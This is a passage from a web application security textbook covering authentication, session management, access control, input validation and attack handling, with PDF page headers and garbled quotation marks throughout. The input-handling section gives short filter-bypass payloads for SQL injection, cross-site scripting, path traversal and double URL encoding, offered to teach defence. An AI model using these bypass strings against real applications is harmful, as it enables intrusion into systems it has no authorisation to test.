they are the potential gateways for a wide range of attacks, and defenses against 
these attacks must be implemented within the applications themselves. A single 
c01.indd 12 c01.indd 12 8/19/2011 12:02:04 PM 8/19/2011 12:02:04 PM
Stuttard c01.indd V2 - 07/07/2011 Page 13
 Chapter 1 n Web Application (In)security 13
line of defective code in a single web application can render an organization‚Äôs 
internal systems vulnerable. Furthermore, with the rise of mash-up applications, 
third-party widgets, and other techniques for cross-domain integration, the 
server-side security perimeter frequently extends well beyond the organization 
itself. Implicit trust is placed in the services of external applications and services. 
The statistics described previously, of the incidence of vulnerabilities within 
this new security perimeter, should give every organization pause for thought.
NOTE For an attacker targeting an organization, gaining access to the network or executing arbitrary commands on servers may not be what he wants 
to achieve. Often, and perhaps typically, what an attacker really wants is to 
perform some application-level action such as stealing personal information, transferring funds, or making cheap purchases. And the relocation of the 
security perimeter to the application layer may greatly assist an attacker in 
achieving these objectives.
For example, suppose that an attacker wants to ‚Äúhack in‚Äù to a bank‚Äôs systems 
and steal money from users‚Äô accounts. In the past, before the bank deployed 
a web application, the attacker might have needed to fi nd a vulnerability 
in a publicly reachable service, exploit this to gain a toehold on the bank‚Äôs 
DMZ, penetrate the fi rewall restricting access to its internal systems, map the 
network to fi nd the mainframe computer, decipher the arcane protocol used 
to access it, and guess some credentials to log in. However, if the bank now 
deploys a vulnerable web application, the attacker may be able to achieve the 
same outcome simply by modifying an account number in a hidden fi eld of an 
HTML form.
A second way in which web applications have moved the security perimeter 
arises from the threats that users themselves face when they access a vulnerable application. A malicious attacker can leverage a benign but vulnerable web 
application to attack any user who visits it. If that user is located on an internal 
corporate network, the attacker may harness the user‚Äôs browser to launch an 
attack against the local network from the user‚Äôs trusted position. Without any 
cooperation from the user, the attacker may be able to carry out any action that 
the user could perform if she were herself malicious. With the proliferation of 
browser extension technologies and plug-ins, the extent of the client-side attack 
surface has increased considerably.
Network administrators are familiar with the idea of preventing their users 
from visiting malicious web sites, and end users themselves are gradually becoming more aware of this threat. But the nature of web application vulnerabilities 
means that a vulnerable application may present no less of a threat to its users 
and their organization than a web site that is overtly malicious. Correspondingly, 
the new security perimeter imposes a duty of care on all application owners 
to protect their users from attacks against them delivered via the application.
c01.indd 13 c01.indd 13 8/19/2011 12:02:04 PM 8/19/2011 12:02:04 PM
Stuttard c01.indd V2 - 07/07/2011 Page 14
14 Chapter 1 n Web Application (In)security
A further way in which the security perimeter has partly moved to the client side is through the widespread use of e-mail as an extended authentication 
mechanism. A huge number of today‚Äôs applications contain ‚Äúforgotten password‚Äù 
functions that allow an attacker to generate an account recovery e-mail to any 
registered address, without requiring any other user-specifi c information. This 
allows an attacker who compromises a user‚Äôs web mail account to easily escalate 
the attack and compromise the victim‚Äôs accounts on most of the web applications 
for which the victim is registered.
The Future of Web Application Security
Over a decade after their widespread adoption, web applications on the Internet 
today are still rife with vulnerabilities. Understanding of the security threats 
facing web applications, and effective ways of addressing these, are still underdeveloped within the industry. There is currently little indication that the problem 
factors described in this chapter will disappear in the near future.
That said, the details of the web application security landscape are not static. 
Even though old and well-understood vulnerabilities such as SQL injection 
continue to appear, their prevalence is gradually diminishing. Furthermore, 
the instances that remain are becoming more diffi cult to fi nd and exploit. New 
research in these areas is generally focused on developing advanced techniques 
for attacking more subtle manifestations of vulnerabilities that a few years ago 
could be easily detected and exploited using only a browser.
A second prominent trend has been a gradual shift in attention from attacks 
against the server side of the application to those that target application users. 
The latter kind of attack still leverages defects within the application itself, but 
it generally involves some kind of interaction with another user to compromise 
that user‚Äôs dealings with the vulnerable application. This is a trend that has 
been replicated in other areas of software security. As awareness of security 
threats matures, fl aws in the server side are the fi rst to be well understood and 
addressed, leaving the client side as a key battleground as the learning process 
continues. Of all the attacks described in this book, those against other users 
are evolving the most quickly, and they have been the focus of most research 
in recent years.
Various recent trends in technology have somewhat altered the landscape of 
web applications. Popular consciousness about these trends exists by means of 
various rather misleading buzzwords, the most prominent of which are these:
n Web 2.0 ‚Äî This term refers to the greater use of functionality that enables 
user-generated content and information sharing, and also the adoption 
of various technologies that broadly support this functionality, including 
asynchronous HTTP requests and cross-domain integration.
c01.indd 14 c01.indd 14 8/19/2011 12:02:04 PM 8/19/2011 12:02:04 PM
Stuttard c01.indd V2 - 07/07/2011 Page 15
 Chapter 1 n Web Application (In)security 15
n Cloud computing ‚Äî This term refers to greater use of external service 
providers for various parts of the technology stack, including application software, application platforms, web server software, databases, and 
hardware. It also refers to increased usage of virtualization technologies 
within hosting environments.
As with most changes in technology, these trends have brought with them 
some new attacks and variations on existing attacks. Notwithstanding the hype, 
the issues raised are not quite as revolutionary as they may initially appear. We 
will examine the security implications of these and other recent trends in the 
appropriate locations throughout this book.
Despite all the changes that have occurred within web applications, some 
categories of ‚Äúclassic‚Äù vulnerabilities show no sign of diminishing. They continue 
to arise in pretty much the same form as they did in the earliest days of the 
web. These include defects in business logic, failures to properly apply access 
controls, and other design issues. Even in a world of bolted-together application components and everything-as-a-service, these timeless issues are likely 
to remain widespread.
Summary
In a little over a decade, the World Wide Web has evolved from purely static 
information repositories into highly functional applications that process sensitive 
data and perform powerful actions with real-world consequences. During this 
development, several factors have combined to bring about the weak security 
posture demonstrated by the majority of today‚Äôs web applications.
Most applications face the core security problem that users can submit arbitrary input. Every aspect of the user‚Äôs interaction with the application may be 
malicious and should be regarded as such unless proven otherwise. Failure to 
properly address this problem can leave applications vulnerable to attack in 
numerous ways.
All the evidence about the current state of web application security indicates 
that although some aspects of security have indeed improved, entirely new 
threats have evolved to replace them. The overall problem has not been resolved 
on any signifi cant scale. Attacks against web applications still present a serious 
threat to both the organizations that deploy them and the users who access them.
c01.indd 15 c01.indd 15 8/19/2011 12:02:04 PM 8/19/2011 12:02:04 PM
Stuttard c01.indd V2 - 07/07/2011 Page 16
c01.indd 16 c01.indd 16 8/19/2011 12:02:04 PM 8/19/2011 12:02:04 PM
Stuttard c02.indd V3 - 07/22/2011 Page 17
17
 C H A P T E R 
2
Core Defense Mechanisms
The fundamental security problem with web applications ‚Äî that all user input 
is untrusted ‚Äî gives rise to a number of security mechanisms that applications use to defend themselves against attack. Virtually all applications employ 
mechanisms that are conceptually similar, although the details of the design 
and the effectiveness of the implementation vary greatly.
The defense mechanisms employed by web applications comprise the following 
core elements:
n Handling user access to the application‚Äôs data and functionality to prevent 
users from gaining unauthorized access
n Handling user input to the application‚Äôs functions to prevent malformed 
input from causing undesirable behavior
n Handling attackers to ensure that the application behaves appropriately 
when being directly targeted, taking suitable defensive and offensive 
measures to frustrate the attacker
n Managing the application itself by enabling administrators to monitor its 
activities and confi gure its functionality
Because of their central role in addressing the core security problem, these 
mechanisms also make up the vast majority of a typical application‚Äôs attack 
surface. If knowing your enemy is the fi rst rule of warfare, then understanding 
these mechanisms thoroughly is the main prerequisite for being able to attack 
c02.indd 17 c02.indd 17 8/19/2011 12:02:41 PM 8/19/2011 12:02:41 PM
Stuttard c02.indd V3 - 07/22/2011 Page 18
18 Chapter 2 n Core Defense Mechanisms
applications effectively. If you are new to hacking web applications (and even 
if you are not), you should be sure to take time to understand how these core 
mechanisms work in each of the applications you encounter, and identify the 
weak points that leave them vulnerable to attack.
Handling User Access
A central security requirement that virtually any application needs to meet is 
controlling users‚Äô access to its data and functionality. A typical situation has 
several different categories of user, such as anonymous users, ordinary authenticated users, and administrative users. Furthermore, in many situations different 
users are permitted to access a different set of data. For example, users of a web 
mail application should be able to read their own e-mail but not other people‚Äôs.
Most web applications handle access using a trio of interrelated security 
mechanisms:
n Authentication
n Session management
n Access control
Each of these mechanisms represents a signifi cant area of an application‚Äôs 
attack surface, and each is fundamental to an application‚Äôs overall security 
posture. Because of their interdependencies, the overall security provided by 
the mechanisms is only as strong as the weakest link in the chain. A defect in 
any single component may enable an attacker to gain unrestricted access to the 
application‚Äôs functionality and data. 
Authentication
The authentication mechanism is logically the most basic dependency in an 
application‚Äôs handling of user access. Authenticating a user involves establishing 
that the user is in fact who he claims to be. Without this facility, the application 
would need to treat all users as anonymous ‚Äî the lowest possible level of trust.
The majority of today‚Äôs web applications employ the conventional authentication model, in which the user submits a username and password, which 
the application checks for validity. Figure 2-1 shows a typical login function. 
In security-critical applications such as those used by online banks, this basic 
model is usually supplemented by additional credentials and a multistage login 
process. When security requirements are higher still, other authentication models may be used, based on client certifi cates, smartcards, or challenge-response 
tokens. In addition to the core login process, authentication mechanisms often 
employ a range of other supporting functionality, such as self-registration, 
account recovery, and a password change facility.
c02.indd 18 c02.indd 18 8/19/2011 12:02:41 PM 8/19/2011 12:02:41 PM
Stuttard c02.indd V3 - 07/22/2011 Page 19
 Chapter 2 n Core Defense Mechanisms 19
Figure 2-1: A typical login function
Despite their superfi cial simplicity, authentication mechanisms suffer from a 
wide range of defects in both design and implementation. Common problems 
may enable an attacker to identify other users‚Äô usernames, guess their passwords, or bypass the login function by exploiting defects in its logic. When 
you are attacking a web application, you should invest a signifi cant amount of 
attention to the various authentication-related functions it contains. Surprisingly 
frequently, defects in this functionality enable you to gain unauthorized access 
to sensitive data and functionality.
Session Management
The next logical task in the process of handling user access is to manage the 
authenticated user‚Äôs session. After successfully logging in to the application, the 
user accesses various pages and functions, making a series of HTTP requests from 
his browser. At the same time, the application receives countless other requests 
from different users, some of whom are authenticated and some of whom are 
anonymous. To enforce effective access control, the application needs a way to 
identify and process the series of requests that originate from each unique user.
Virtually all web applications meet this requirement by creating a session for 
each user and issuing the user a token that identifi es the session. The session 
itself is a set of data structures held on the server that track the state of the user‚Äôs 
interaction with the application. The token is a unique string that the application maps to the session. When a user receives a token, the browser automatically submits it back to the server in each subsequent HTTP request, enabling 
the application to associate the request with that user. HTTP cookies are the 
standard method for transmitting session tokens, although many applications 
use hidden form fi elds or the URL query string for this purpose. If a user does 
not make a request for a certain amount of time, the session is ideally expired, 
as shown in Figure 2-2.
c02.indd 19 c02.indd 19 8/19/2011 12:02:41 PM 8/19/2011 12:02:41 PM
Stuttard c02.indd V3 - 07/22/2011 Page 20
20 Chapter 2 n Core Defense Mechanisms
Figure 2-2: An application enforcing session timeout
In terms of attack surface, the session management mechanism is highly 
dependent on the security of its tokens. The majority of attacks against it seek to 
compromise the tokens issued to other users. If this is possible, an attacker can 
masquerade as the victim user and use the application just as if he had actually 
authenticated as that user. The principal areas of vulnerability arise from defects 
in how tokens are generated, enabling an attacker to guess the tokens issued to 
other users, and defects in how tokens are subsequently handled, enabling an 
attacker to capture other users‚Äô tokens.
A small number of applications dispense with the need for session tokens by 
using other means of reidentifying users across multiple requests. If HTTP‚Äôs 
built-in authentication mechanism is used, the browser automatically resubmits 
the user‚Äôs credentials with each request, enabling the application to identify the 
user directly from these. In other cases, the application stores the state information on the client side rather than the server, usually in encrypted form to 
prevent tampering.
Access Control
The fi nal logical step in the process of handling user access is to make and enforce 
correct decisions about whether each individual request should be permitted or 
denied. If the mechanisms just described are functioning correctly, the application knows the identity of the user from whom each request is received. On this 
basis, it needs to decide whether that user is authorized to perform the action, 
or access the data, that he is requesting, as shown in Figure 2-3.
The access control mechanism usually needs to implement some fi ne-grained 
logic, with different considerations being relevant to different areas of the 
application and different types of functionality. An application might support 
numerous user roles, each involving different combinations of specifi c privileges. 
Individual users may be permitted to access a subset of the total data held within 
the application. Specifi c functions may implement transaction limits and other 
checks, all of which need to be properly enforced based on the user‚Äôs identity.
Because of the complex nature of typical access control requirements, this 
mechanism is a frequent source of security vulnerabilities that enable an attacker 
c02.indd 20 c02.indd 20 8/19/2011 12:02:42 PM 8/19/2011 12:02:42 PM
Stuttard c02.indd V3 - 07/22/2011 Page 21
 Chapter 2 n Core Defense Mechanisms 21
to gain unauthorized access to data and functionality. Developers often make 
fl awed assumptions about how users will interact with the application and 
frequently make oversights by omitting access control checks from some application functions. Probing for these vulnerabilities is often laborious, because 
essentially the same checks need to be repeated for each item of functionality. 
Because of the prevalence of access control fl aws, however, this effort is always 
a worthwhile investment when you are attacking a web application. Chapter 
8 describes how you can automate some of the effort involved in performing 
rigorous access control testing.
Figure 2-3: An application enforcing access control
Handling User Input
Recall the fundamental security problem described in Chapter 1: All user input 
is untrusted. A huge variety of attacks against web applications involve submitting unexpected input, crafted to cause behavior that was not intended by the 
application‚Äôs designers. Correspondingly, a key requirement for an application‚Äôs 
security defenses is that the application must handle user input in a safe manner.
Input-based vulnerabilities can arise anywhere within an application‚Äôs functionality, and in relation to practically every type of technology in common use. 
‚ÄúInput validation‚Äù is often cited as the necessary defense against these attacks. 
However, no single protective mechanism can be employed everywhere, and 
defending against malicious input is often not as straightforward as it sounds.
Varieties of Input
A typical web application processes user-supplied data in many different forms. 
Some kinds of input validation may not be feasible or desirable for all these 
forms of input. Figure 2-4 shows the kind of input validation often performed 
by a user registration function.
c02.indd 21 c02.indd 21 8/19/2011 12:02:42 PM 8/19/2011 12:02:42 PM
Stuttard c02.indd V3 - 07/22/2011 Page 22
22 Chapter 2 n Core Defense Mechanisms
Figure 2-4: An application performing input validation
Must contain at least 4 characters
Must contain at least 4 characters
Please provide a valid email address
Must contain only numbers
In many cases, an application may be able to impose very stringent validation checks on a specifi c item of input. For example, a username submitted to a 
login function may be required to have a maximum length of eight characters 
and contain only alphabetical characters.
In other cases, the application must tolerate a wider range of possible input. 
For example, an address fi eld submitted to a personal details page might legitimately contain letters, numbers, spaces, hyphens, apostrophes, and other characters. However, for this item, restrictions still can be feasibly imposed. The data 
should not exceed a reasonable length limit (such as 50 characters) and should 
not contain any HTML markup.
In some situations, an application may need to accept arbitrary input from 
users. For example, a user of a blogging application may create a blog whose 
subject is web application hacking. Posts and comments made to the blog may 
quite legitimately contain explicit attack strings that are being discussed. The 
application may need to store this input in a database, write it to disk, and display 
it back to users in a safe way. It cannot simply reject the input just because it 
looks potentially malicious without substantially diminishing the application‚Äôs 
value to some of its user base.
In addition to the various kinds of input that users enter using the browser 
interface, a typical application receives numerous items of data that began their 
life on the server and that are sent to the client so that the client can transmit 
them back to the server on subsequent requests. This includes items such as 
cookies and hidden form fi elds, which are not seen by ordinary users of the 
application but which an attacker can of course view and modify. In these cases, 
applications can often perform very specifi c validation of the data received. For 
example, a parameter might be required to have one of a specifi c set of known 
values, such as a cookie indicating the user‚Äôs preferred language, or to be in a 
specifi c format, such as a customer ID number. Furthermore, when an application detects that server-generated data has been modifi ed in a way that is not 
possible for an ordinary user with a standard browser, this often indicates 
that the user is attempting to probe the application for vulnerabilities. In these 
c02.indd 22 c02.indd 22 8/19/2011 12:02:42 PM 8/19/2011 12:02:42 PM
Stuttard c02.indd V3 - 07/22/2011 Page 23
 Chapter 2 n Core Defense Mechanisms 23
cases, the application should reject the request and log the incident for potential 
investigation (see the ‚ÄúHandling Attackers‚Äù section later in this chapter).
Approaches to Input Handling
Various broad approaches are commonly taken to the problem of handling 
user input. Different approaches are often preferable for different situations 
and different types of input, and a combination of approaches may sometimes 
be desirable.
‚ÄúReject Known Bad‚Äù
This approach typically employs a blacklist containing a set of literal strings or 
patterns that are known to be used in attacks. The validation mechanism blocks 
any data that matches the blacklist and allows everything else.
In general, this is regarded as the least effective approach to validating user 
input, for two main reasons. First, a typical vulnerability in a web application can be exploited using a wide variety of input, which may be encoded or 
represented in various ways. Except in the simplest of cases, it is likely that a 
blacklist will omit some patterns of input that can be used to attack the application. Second, techniques for exploitation are constantly evolving. Novel methods 
for exploiting existing categories of vulnerabilities are unlikely to be blocked 
by current blacklists.
Many blacklist-based fi lters can be bypassed with almost embarrassing ease 
by making trivial adjustments to the input that is being blocked. For example:
n If SELECT is blocked, try SeLeCt
n If or 1=1-- is blocked, try or 2=2--
n If alert(‚Äòxss‚Äô) is blocked, try prompt(‚Äòxss‚Äô)
In other cases, fi lters designed to block specifi c keywords can be bypassed by 
using nonstandard characters between expressions to disrupt the tokenizing 
performed by the application. For example:
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
<img%09onerror=alert(1) src=a>
Finally, numerous blacklist-based fi lters, particularly those implemented in 
web application fi rewalls, have been vulnerable to NULL byte attacks. Because 
of the different ways in which strings are handled in managed and unmanaged 
execution contexts, inserting a NULL byte anywhere before a blocked expression 
can cause some fi lters to stop processing the input and therefore not identify 
the expression. For example:
%00<script>alert(1)</script>
c02.indd 23 c02.indd 23 8/19/2011 12:02:42 PM 8/19/2011 12:02:42 PM
Stuttard c02.indd V3 - 07/22/2011 Page 24
24 Chapter 2 n Core Defense Mechanisms
Various other techniques for attacking web application fi rewalls are described 
in Chapter 18.
NOTE Attacks that exploit the handling of NULL bytes arise in many areas 
of web application security. In contexts where a NULL byte acts as a string 
delimiter, it can be used to terminate a fi lename or a query to some backend component. In contexts where NULL bytes are tolerated and ignored 
(for example, within HTML in some browsers), arbitrary NULL bytes can be 
inserted within blocked expressions to defeat some blacklist-based fi lters. 
Attacks of this kind are discussed in detail in later chapters.
‚ÄúAccept Known Good‚Äù
This approach employs a whitelist containing a set of literal strings or patterns, 
or a set of criteria, that is known to match only benign input. The validation 
mechanism allows data that matches the whitelist and blocks everything else. 
For example, before looking up a requested product code in the database, an 
application might validate that it contains only alphanumeric characters and is 
exactly six characters long. Given the subsequent processing that will be done 
on the product code, the developers know that input passing this test cannot 
possibly cause any problems.
In cases where this approach is feasible, it is regarded as the most effective 
way to handle potentially malicious input. Provided that due care is taken in 
constructing the whitelist, an attacker will be unable to use crafted input to 
interfere with the application‚Äôs behavior. However, in numerous situations an 
application must accept data for processing that does not meet any reasonable 
criteria for what is known to be ‚Äúgood.‚Äù For example, some people‚Äôs names contain 
an apostrophe or hyphen. These can be used in attacks against databases, but 
it may be a requirement that the application should permit anyone to register 
under his or her real name. Hence, although it is often extremely effective, the 
whitelist-based approach does not represent an all-purpose solution to the 
problem of handling user input.
Sanitization
This approach recognizes the need to sometimes accept data that cannot be 
guaranteed as safe. Instead of rejecting this input, the application sanitizes it 
in various ways to prevent it from having any adverse effects. Potentially malicious characters may be removed from the data, leaving only what is known to 
be safe, or they may be suitably encoded or ‚Äúescaped‚Äù before further processing 
is performed.
Approaches based on data sanitization are often highly effective, and in many 
situations they can be relied on as a general solution to the problem of malicious 
c02.indd 24 c02.indd 24 8/19/2011 12:02:42 PM 8/19/2011 12:02:42 PM
Stuttard c02.indd V3 - 07/22/2011 Page 25
 Chapter 2 n Core Defense Mechanisms 25
input. For example, the usual defense against cross-site scripting attacks is to 
HTML-encode dangerous characters before these are embedded into pages of the 
application (see Chapter 12). However, effective sanitization may be diffi cult to 
achieve if several kinds of potentially malicious data need to be accommodated 
within one item of input. In this situation, a boundary validation approach is 
desirable, as described later.
Safe Data Handling
Many web application vulnerabilities arise because user-supplied data is processed in unsafe ways. Vulnerabilities often can be avoided not by validating 
the input itself but by ensuring that the processing that is performed on it is 
inherently safe. In some situations, safe programming methods are available 
that avoid common problems. For example, SQL injection attacks can be prevented through the correct use of parameterized queries for database access 
(see Chapter 9). In other situations, application functionality can be designed 
in such a way that inherently unsafe practices, such as passing user input to an 
operating system command interpreter, are avoided.
This approach cannot be applied to every kind of task that web applications 
need to perform. But where it is available, it is an effective general approach to 
handling potentially malicious input.
Semantic Checks
The defenses described so far all address the need to defend the application against 
various kinds of malformed data whose content has been crafted to interfere 
with the application‚Äôs processing. However, with some vulnerabilities the input 
supplied by the attacker is identical to the input that an ordinary, nonmalicious 
user may submit. What makes it malicious is the different circumstances under 
which it is submitted. For example, an attacker might seek to gain access to 
another user‚Äôs bank account by changing an account number transmitted in a 
hidden form fi eld. No amount of syntactic validation will distinguish between 
the user‚Äôs data and the attacker‚Äôs. To prevent unauthorized access, the application needs to validate that the account number submitted belongs to the user 
who has submitted it.
Boundary Validation
The idea of validating data across trust boundaries is a familiar one. The core 
security problem with web applications arises because data received from users 
is untrusted. Although input validation checks implemented on the client side 
may improve performance and the user‚Äôs experience, they do not provide any 
assurance about the data that actually reaches the server. The point at which 
c02.indd 25 c02.indd 25 8/19/2011 12:02:42 PM 8/19/2011 12:02:42 PM
Stuttard c02.indd V3 - 07/22/2011 Page 26
26 Chapter 2 n Core Defense Mechanisms
user data is fi rst received by the server-side application represents a huge trust 
boundary. At this point the application needs to take measures to defend itself 
against malicious input.
Given the nature of the core problem, it is tempting to think of the input 
validation problem in terms of a frontier between the Internet, which is ‚Äúbad‚Äù 
and untrusted, and the server-side application, which is ‚Äúgood‚Äù and trusted. In 
this picture, the role of input validation is to clean potentially malicious data on 
arrival and then pass the clean data to the trusted application. From this point 
onward, the data may be trusted and processed without any further checks or 
concern about possible attacks.
As will become evident when we begin to examine some actual vulnerabilities, this simple picture of input validation is inadequate for several reasons:
n Given the wide range of functionality that applications implement, and the 
different technologies in use, a typical application needs to defend itself 
against a huge variety of input-based attacks, each of which may employ 
a diverse set of crafted data. It would be very diffi cult to devise a single 
mechanism at the external boundary to defend against all these attacks.
n Many application functions involve chaining together a series of different 
types of processing. A single piece of user-supplied input might result in 
a number of operations in different components, with the output of each 
being used as the input for the next. As the data is transformed, it might 
come to bear no resemblance to the original input. A skilled attacker 
may be able to manipulate the application to cause malicious input to be 
generated at a key stage of the processing, attacking the component that 
receives this data. It would be extremely diffi cult to implement a validation mechanism at the external boundary to foresee all the possible results 
of processing each piece of user input.
n Defending against different categories of input-based attack may entail 
performing different validation checks on user input that are incompatible with one another. For example, preventing cross-site scripting attacks 
may require the application to HTML-encode the > character as &gt;, and 
preventing command injection attacks may require the application to 
block input containing the & and ; characters. Attempting to prevent all 
categories of attack simultaneously at the application‚Äôs external boundary 
may sometimes be impossible.
A more effective model uses the concept of boundary validation. Here, each 
individual component or functional unit of the server-side application treats 
its inputs as coming from a potentially malicious source. Data validation is 
performed at each of these trust boundaries, in addition to the external frontier 
between the client and server. This model provides a solution to the problems 
just described. Each component can defend itself against the specifi c types of 
crafted input to which it may be vulnerable. As data passes through different 
c02.indd 26 c02.indd 26 8/19/2011 12:02:42 PM 8/19/2011 12:02:42 PM
Stuttard c02.indd V3 - 07/22/2011 Page 27
 Chapter 2 n Core Defense Mechanisms 27
components, validation checks can be performed against whatever value the data 
has as a result of previous transformations. And because the various validation 
checks are implemented at different stages of processing, they are unlikely to 
come into confl ict with one another.
Figure 2-5 illustrates a typical situation where boundary validation is the 
most effective approach to defending against malicious input. The user login 
results in several steps of processing being performed on user-supplied input, 
and suitable validation is performed at each step:
 1. The application receives the user‚Äôs login details. The form handler validates that each item of input contains only permitted characters, is within 
a specifi c length limit, and does not contain any known attack signatures.
 2. The application performs a SQL query to verify the user‚Äôs credentials. 
To prevent SQL injection attacks, any characters within the user input 
that may be used to attack the database are escaped before the query is 
constructed.
 3. If the login succeeds, the application passes certain data from the user‚Äôs 
profi le to a SOAP service to retrieve further information about her account. 
To prevent SOAP injection attacks, any XML metacharacters within the 
user‚Äôs profi le data are suitably encoded.
 4. The application displays the user‚Äôs account information back to the user‚Äôs 
browser. To prevent cross-site scripting attacks, the application HTMLencodes any user-supplied data that is embedded into the returned page.
Figure 2-5: An application function using boundary validation at multiple stages of 
processing
Database
SOAP service
Application
server
1. General checks
User
4. Sanitize output
Login submission
Display account details
SQL query
2. Clean SQL
SOAP
message
3. Encode XML
metacharacters
c02.indd 27 c02.indd 27 8/19/2011 12:02:42 PM 8/19/2011 12:02:42 PM
Stuttard c02.indd V3 - 07/22/2011 Page 28
28 Chapter 2 n Core Defense Mechanisms
The specifi c vulnerabilities and defenses involved in this scenario will be 
examined in detail in later chapters. If variations on this functionality involved 
passing data to further application components, similar defenses would need 
to be implemented at the relevant trust boundaries. For example, if a failed 
login caused the application to send a warning e-mail to the user, any user 
data incorporated into the e-mail may need to be checked for SMTP injection 
attacks.
Multistep Validation and Canonicalization
A common problem encountered by input-handling mechanisms arises when 
user-supplied input is manipulated across several steps as part of the validation logic. If this process is not handled carefully, an attacker may be able to 
construct crafted input that succeeds in smuggling malicious data through the 
validation mechanism. One version of this problem occurs when an application 
attempts to sanitize user input by removing or encoding certain characters or 
expressions. For example, an application may attempt to defend against some 
cross-site scripting attacks by stripping the expression:
<script>
from any user-supplied data. However, an attacker may be able to bypass the 
fi lter by supplying the following input:
<scr<script>ipt>
When the blocked expression is removed, the surrounding data contracts 
to restore the malicious payload, because the filter is not being applied 
recursively.
Similarly, if more than one validation step is performed on user input, an 
attacker may be able to exploit the ordering of these steps to bypass the fi lter. 
For example, if the application fi rst removes ../ recursively and then removes 
..\ recursively, the following input can be used to defeat the validation:
....\/
A related problem arises in relation to data canonicalization. When input 
is sent from the user‚Äôs browser, it may be encoded in various ways. These 
encoding schemes exist so that unusual characters and binary data may be 
transmitted safely over HTTP (see Chapter 3 for more details). Canonicalization 
is the process of converting or decoding data into a common character set. If 
any canonicalization is carried out after input fi lters have been applied, an 
attacker may be able to use a suitable encoding scheme to bypass the validation mechanism.
For example, an application may attempt to defend against some SQL injection attacks by blocking input containing the apostrophe character. However, if 
c02.indd 28 c02.indd 28 8/19/2011 12:02:43 PM 8/19/2011 12:02:43 PM
Stuttard c02.indd V3 - 07/22/2011 Page 29
 Chapter 2 n Core Defense Mechanisms 29
the input is subsequently canonicalized, an attacker may be able to use double 
URL encoding to defeat the fi lter. For example:
%2527
When this input is received, the application server performs its normal URL 
decode, so the input becomes:
%27
This does not contain an apostrophe, so it is permitted by the application‚Äôs fi lters. 
But when the application performs a further URL decode, the input is converted 
into an apostrophe, thereby bypassing the fi lter.
If the application strips the apostrophe instead of blocking it, and then performs further canonicalization, the following bypass may be effective:
%%2727
It is worth noting that the multiple validation and canonicalization steps 
in these cases need not all take place on the server side of the application. For 
example, in the following input several characters have been HTML-encoded:
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
If the server-side application uses an input fi lter to block certain JavaScript 
expressions and characters, the encoded input may succeed in bypassing the 
fi lter. However, if the input is then copied into the application‚Äôs response, some 
browsers perform an HTML decode of the src parameter value, and the embedded JavaScript executes.
In addition to the standard encoding schemes that are intended for use in 
web applications, canonicalization issues can arise in other situations where a 
component employed by the application converts data from one character set 
to another. For example, some technologies perform a ‚Äúbest fi t‚Äù mapping of 
characters based on similarities in their printed glyphs. Here, the characters ¬´
and ¬ª may be converted into < and >, respectively, and ≈∏ and √Ç are converted 
into Y and A. This behavior can often be leveraged to smuggle blocked characters 
or keywords past an application‚Äôs input fi lters.
Throughout this book, we will describe numerous attacks of this kind, which 
are effective in defeating many applications‚Äô defenses against common inputbased vulnerabilities.
Avoiding problems with multistep validation and canonicalization can sometimes be diffi cult, and there is no single solution to the problem. One approach is 
to perform sanitization steps recursively, continuing until no further modifi cations 
have been made on an item of input. However, where the desired sanitization 
involves escaping a problematic character, this may result in an infi nite loop. 
Often, the problem can be addressed only on a case-by-case basis, based on the 
types of validation being performed. Where feasible, it may be preferable to avoid 
attempting to clean some kinds of bad input, and simply reject it altogether.
c02.indd 29 c02.indd 29 8/19/2011 12:02:43 PM 8/19/2011 12:02:43 PM
Stuttard c02.indd V3 - 07/22/2011 Page 30
30 Chapter 2 n Core Defense Mechanisms
Handling Attackers
Anyone designing an application for which security is remotely important must 
assume that it will be directly targeted by dedicated and skilled attackers. A key 
function of the application‚Äôs security mechanisms is being able to handle and 
react to these attacks in a controlled way. These mechanisms often incorporate 
a mix of defensive and offensive measures designed to frustrate an attacker as 
much as possible and give the application‚Äôs owners appropriate notifi cation and 
evidence of what has taken place. Measures implemented to handle attackers 
typically include the following tasks:
n Handling errors
n Maintaining audit logs
n Alerting administrators
n Reacting to attacks
Handling Errors
However careful an application‚Äôs developers are when validating user input, it 
is virtually inevitable that some unanticipated errors will occur. Errors resulting 
from the actions of ordinary users are likely to be identifi ed during functionality and user acceptance testing. Therefore, they are taken into account before 
the application is deployed in a production context. However, it is diffi cult to 
anticipate every possible way in which a malicious user may interact with the 
application, so further errors should be expected when the application comes 
under attack.
A key defense mechanism is for the application to handle unexpected errors 
gracefully, and either recover from them or present a suitable error message 
to the user. In a production context, the application should never return any 
system-generated messages or other debug information in its responses. As 
you will see throughout this book, overly verbose error messages can greatly 
assist malicious users in furthering their attacks against the application. In some 
situations, an attacker can leverage defective error handling to retrieve sensitive information within the error messages themselves, providing a valuable 
channel for stealing data from the application. Figure 2-6 shows an example of 
an unhandled error resulting in a verbose error message.
Most web development languages provide good error-handling support 
through try-catch blocks and checked exceptions. Application code should 
make extensive use of these constructs to catch specifi c and general errors and 
handle them appropriately. Furthermore, most application servers can be confi gured to deal with unhandled application errors in customized ways, such as 
c02.indd 30 c02.indd 30 8/19/2011 12:02:43 PM 8/19/2011 12:02:43 PM
Stuttard c02.indd V3 - 07/22/2011 Page 31
 Chapter 2 n Core Defense Mechanisms 31
by presenting an uninformative error message. See Chapter 15 for more details 
on these measures.
Figure 2-6: An unhandled error
Effective error handling is often integrated with the application‚Äôs logging 
mechanisms, which record as much debug information as possible about unanticipated errors. Unexpected errors often point to defects within the application‚Äôs 
defenses that can be addressed at the source if the application‚Äôs owner has the 
required information.
Maintaining Audit Logs
Audit logs are valuable primarily when investigating intrusion attempts against 
an application. Following such an incident, effective audit logs should enable 
the application‚Äôs owners to understand exactly what has taken place, which 
vulnerabilities (if any) were exploited, whether the attacker gained unauthorized 
access to data or performed any unauthorized actions, and, as far as possible, 
provide evidence of the intruder‚Äôs identity.
c02.indd 31 c02.indd 31 8/19/2011 12:02:43 PM 8/19/2011 12:02:43 PM
Stuttard c02.indd V3 - 07/22/2011 Page 32
32 Chapter 2 n Core Defense Mechanisms
In any application for which security is important, key events should be logged 
as a matter of course. At a minimum, these typically include the following:
n All events relating to the authentication functionality, such as successful 
and failed login, and change of password
n Key transactions, such as credit card payments and funds transfers
n Access attempts that are blocked by the access control mechanisms
n Any requests containing known attack strings that indicate overtly malicious intentions
In many security-critical applications, such as those used by online banks, 
every client request is logged in full, providing a complete forensic record that 
can be used to investigate any incidents.
Effective audit logs typically record the time of each event, the IP address 
